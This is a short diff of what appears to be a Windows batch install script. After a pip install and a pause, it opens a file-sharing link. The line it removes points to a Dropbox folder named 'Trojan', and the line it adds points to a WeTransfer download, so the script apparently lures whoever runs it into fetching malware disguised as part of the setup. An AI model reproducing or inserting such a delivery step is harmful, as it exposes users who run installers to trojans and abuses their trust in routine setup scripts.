@@ -4,4 +4,4 @@ python -m pip install -r requirements.txt
 cls
 echo enter!!!
 pause
-start https://www.dropbox.com/home/Trojan
+start https://we.tl/t-AatuUHPrFm
